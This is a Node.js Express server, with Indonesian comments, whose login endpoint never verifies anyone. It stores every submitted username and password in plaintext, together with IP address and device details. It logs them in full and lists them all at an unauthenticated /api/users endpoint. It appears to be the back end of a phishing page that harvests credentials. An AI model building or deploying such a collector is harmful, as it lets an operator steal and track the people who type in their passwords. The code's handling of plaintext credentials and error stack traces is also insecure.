const express = require('express');
const cors = require('cors');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// In-memory storage untuk Vercel (karena tidak ada file system)
let userDataStore = [];

// Initialize dengan data kosong
console.log('🚀 Vercel API Server Started');
console.log('📊 Initial user count: 0');

// Login endpoint
app.post('/api/login', (req, res) => {
  try {
    console.log('='.repeat(50));
    console.log('🔥 NEW LOGIN REQUEST RECEIVED');
    console.log('📥 Request headers:', req.headers);
    console.log('📥 Request body:', req.body);
    console.log('🌐 Request URL:', req.url);
    console.log('📍 Request IP:', req.ip);
    console.log('='.repeat(50));
    
    const { username, password, login_method, user_agent } = req.body;
    
    console.log('📝 Parsed data:', { username, password, login_method, user_agent });
    
    if (!username || !password) {
      console.log('❌ VALIDATION FAILED: Missing username or password');
      return res.status(400).json({ 
        success: false, 
        message: 'Username and password are required' 
      });
    }
    
    console.log('✅ VALIDATION PASSED: Username and password present');
    
    const loginData = {
      username,
      password,
      login_method: login_method || 'manual',
      timestamp: new Date().toISOString(),
      ip_address: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown',
      user_agent: user_agent || req.get('User-Agent'),
      location: getLocationInfo(req.headers['x-forwarded-for'] || 'unknown'),
      device: getDeviceInfo(user_agent || req.get('User-Agent'))
    };
    
    console.log('💾 CONSTRUCTED loginData:', JSON.stringify(loginData, null, 2));
    
    // Simpan ke memory storage (Vercel compatible)
    userDataStore.push(loginData);
    
    console.log('✅ DATA SAVED TO MEMORY!');
    console.log(`📊 NEW TOTAL USERS: ${userDataStore.length}`);
    console.log(`💾 CURRENT STORED DATA:`, JSON.stringify(userDataStore, null, 2));
    console.log('='.repeat(50));
    
    const responseData = { 
      success: true, 
      message: 'Login data saved',
      user_count: userDataStore.length,
      stored_data: loginData,
      timestamp: new Date().toISOString()
    };
    
    console.log('📤 SENDING RESPONSE:', JSON.stringify(responseData, null, 2));
    
    res.json(responseData);
    
  } catch (error) {
    console.log('💥 CATCH BLOCK EXECUTED - ERROR!');
    console.error('💥 Full error details:', error);
    console.log('='.repeat(50));
    
    res.status(500).json({ 
      success: false, 
      message: 'Error saving login data: ' + error.message,
      error_details: error.stack
    });
  }
});

// Get user data endpoint
app.get('/api/users', (req, res) => {
  try {
    console.log('📋 Request for user data');
    console.log(`📊 Current users in memory: ${userDataStore.length}`);
    
    res.json({ 
      success: true, 
      users: userDataStore,
      count: userDataStore.length
    });
  } catch (error) {
    console.error('💥 Error reading user data:', error);
    res.status(500).json({ success: false, message: 'Error reading user data' });
  }
});

// Clear data endpoint
app.delete('/api/clear-data', (req, res) => {
  try {
    userDataStore = [];
    console.log('🗑️ User data cleared from memory');
    
    res.json({ 
      success: true, 
      message: 'User data cleared successfully' 
    });
  } catch (error) {
    console.error('💥 Error clearing user data:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Error clearing user data: ' + error.message 
    });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'healthy',
    users_count: userDataStore.length,
    timestamp: new Date().toISOString(),
    environment: 'vercel-serverless'
  });
});

// Helper functions
function getLocationInfo(ip) {
  if (!ip || ip === 'unknown') {
    return { city: 'Unknown', country: 'Unknown' };
  }
  
  // Mock location data
  return { city: 'Local', country: 'Indonesia' };
}

function getDeviceInfo(userAgent) {
  if (!userAgent) return { type: 'Unknown', os: 'Unknown', browser: 'Unknown' };
  
  const device = { type: 'Desktop', os: 'Unknown', browser: 'Unknown' };
  
  if (userAgent.includes('Windows')) device.os = 'Windows';
  else if (userAgent.includes('Mac')) device.os = 'macOS';
  else if (userAgent.includes('Linux')) device.os = 'Linux';
  else if (userAgent.includes('Android')) device.os = 'Android';
  else if (userAgent.includes('iPhone')) device.os = 'iOS';
  
  if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone')) {
    device.type = 'Mobile';
  } else if (userAgent.includes('Tablet') || userAgent.includes('iPad')) {
    device.type = 'Tablet';
  }
  
  if (userAgent.includes('Chrome')) device.browser = 'Chrome';
  else if (userAgent.includes('Firefox')) device.browser = 'Firefox';
  else if (userAgent.includes('Safari')) device.browser = 'Safari';
  else if (userAgent.includes('Edge')) device.browser = 'Edge';
  return device;
}

module.exports = app;
